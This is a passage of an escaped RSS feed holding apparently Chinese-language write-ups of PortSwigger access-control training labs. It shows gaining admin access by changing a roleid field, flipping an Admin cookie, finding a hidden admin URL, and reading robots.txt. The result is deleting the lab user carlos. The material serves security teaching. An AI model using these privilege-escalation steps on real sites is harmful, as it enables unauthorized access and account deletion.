+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;email&amp;#34;:&amp;#34;wiener@normal-user.net&amp;#34;, &amp;#34;roleid&amp;#34;: 2}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Location&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">/my-account&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">application/json; charset=utf-8&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">SAMEORIGIN&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">126&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;username&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;wiener&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;email&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;wiener@normal-user.net&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;apikey&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;b4TKwc7GKnd2UGazpdC4u8QnlvAU6Ym3&amp;#34;&lt;/span>,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">&amp;#34;roleid&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="5">
+&lt;li>访问&lt;code>/admin&lt;/code>并且点击&lt;code>carlos - Delete&lt;/code>即可解题&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: User role controlled by request parameter</title><link>/portswigger-posts/access-control-lab-user-role-controlled-by-request-parameter/</link><pubDate>Sun, 08 Dec 2024 19:12:29 +0800</pubDate><guid>/portswigger-posts/access-control-lab-user-role-controlled-by-request-parameter/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-role-controlled-by-request-parameter-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-user-role-controlled-by-request-parameter-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>使用&lt;code>wiener:peter&lt;/code>进行登录&lt;/li>
+&lt;li>访问&lt;code>/admin&lt;/code>后出现&lt;code>Admin interface only available if logged in as an administrator &lt;/code>，其对应Request
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">GET&lt;/span> /admin &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">session=3KZzj5osf2p8Nuq3s0z7JVUN9e95bK95; Admin=false&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>通过浏览器修改&lt;code>Cookie&lt;/code>中&lt;code>Admin&lt;/code>的值
+&lt;img alt="Cookie" src="/img/2024/access-control-lab-user-role-controlled-by-request-parameter-1.jpg">&lt;/li>
+&lt;li>刷新页面并且点击&lt;code>carlos - Delete&lt;/code>即可解题&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Unprotected admin functionality with unpredictable URL</title><link>/portswigger-posts/access-control-lab-unprotected-admin-functionality-with-unpredictable-url/</link><pubDate>Sun, 08 Dec 2024 19:03:01 +0800</pubDate><guid>/portswigger-posts/access-control-lab-unprotected-admin-functionality-with-unpredictable-url/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-unprotected-admin-functionality-with-unpredictable-url-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-unprotected-admin-functionality-with-unpredictable-url-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>查看Lab Response，并搜索&lt;code>admin&lt;/code>，会发现有admin管理页面
+&lt;img alt="Search result" src="/img/2024/access-control-lab-unprotected-admin-functionality-with-unpredictable-url-2.jpg">&lt;/li>
+&lt;li>访问&lt;code>/admin-bse0oh&lt;/code>
+&lt;img alt="Search result" src="/img/2024/access-control-lab-unprotected-admin-functionality-with-unpredictable-url-3.jpg">&lt;/li>
+&lt;li>点击&lt;code>carlos - Delete&lt;/code>即可解题&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Unprotected admin functionality</title><link>/portswigger-posts/access-control-lab-unprotected-admin-functionality/</link><pubDate>Sun, 08 Dec 2024 18:45:41 +0800</pubDate><guid>/portswigger-posts/access-control-lab-unprotected-admin-functionality/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-unprotected-admin-functionality-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-unprotected-admin-functionality-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>在Lab url后端新增&lt;code>robots.txt&lt;/code>，返回内容如下
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>User-agent: *
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Disallow: /administrator-panel
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>访问&lt;code>/administrator-panel&lt;/code>
+&lt;img alt="Administrator panel" src="/img/2024/access-control-lab-unprotected-admin-functionality-2.jpg">&lt;/li>
+&lt;li>点击&lt;code>carlos - Delete&lt;/code>即可解题&lt;/li>
+&lt;/ol></content></item></channel></rss>
